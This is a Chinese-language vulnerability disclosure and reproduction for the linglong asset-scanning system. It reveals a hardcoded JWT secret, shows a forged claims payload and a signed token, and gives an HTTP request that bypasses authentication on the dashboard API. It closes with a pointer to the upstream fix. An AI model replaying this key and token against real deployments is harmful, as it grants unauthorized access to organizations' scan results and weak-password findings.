# 前言

GitHub上 awake1t/linglong 一款使用golang做后端,vue做前端的甲方资产巡航扫描系统.系统定位是发现资产，进行端口爆破。帮助企业更快发现弱口令问题。主要功能包括: 资产探测、端口爆破、定时任务、管理后台识别、报表展示.其当初还加入过知道创宇的404StarLink的星链计划.但是由于年久失修,最近被爆出认证绕过漏洞,其实这个洞在两年前的pull中就有人提出来了,其次根据jwt.go文件提交记录,最早可以追溯到四年前.

# 漏洞分析+复现

在 http[s]://github[.]com/awake1t/linglong/blob/e28f319a9bb5895453a507d759b7e83bb4b58f2c/pkg/utils/jwt.go#L10 中硬编码 jwt 密钥为 `213123dd1`.

![image](https://github.com/Mr-xn/RedTeam_BlueTeam_HW/assets/18260135/644f7cd5-d36a-4e86-af47-0572396a240c)

![image](https://github.com/Mr-xn/RedTeam_BlueTeam_HW/assets/18260135/3ff16e3a-0873-406a-8bb7-8b2af839a65d)

导致任意人都可以通过此密钥来伪造一个合法的 jwt token.从而通过系统认证.

而linglong的认证组成部分也在上面可以看到,因此我们可以伪造如下

```json
{
  "username": "linglong",
  "password": "123456",
  "exp": 1714068736,
  "iss": "linglong"
}
```

![image](https://github.com/Mr-xn/RedTeam_BlueTeam_HW/assets/18260135/af24d095-19e5-4169-8ed3-f21c465e5c37)

得到一个合法的token

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imxpbmdsb25nIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJleHAiOjE3MTQwNjg3MzYsImlzcyI6Imxpbmdsb25nIn0.rCCTJD_LF08XUwAxZhtOTS-eC3OOtdMAy08LpK1ngh8`
将其带入header的 Authorization 去请求主页面板的API接口

```http
GET /api/v1/dashboard HTTP/1.1
Host: 127.0.0.1:18000
Accept-Language: zh-CN,zh;q=0.9
Referer: http://127.0.0.1:8001/
Accept-Encoding: gzip, deflate, br, zstd
Origin: http://127.0.0.1:8001
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imxpbmdsb25nIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJleHAiOjE3MTQwNjg3MzYsImlzcyI6Imxpbmdsb25nIn0.rCCTJD_LF08XUwAxZhtOTS-eC3OOtdMAy08LpK1ngh8
Accept: application/json, text/plain, */*

```

可以成功通过系统认证获取到数据

![image](https://github.com/Mr-xn/RedTeam_BlueTeam_HW/assets/18260135/2f5ad61b-48a4-4ac4-9ca4-96459ba5b8ba)

如果需要修复,可以参考 pull #75 进行修复.
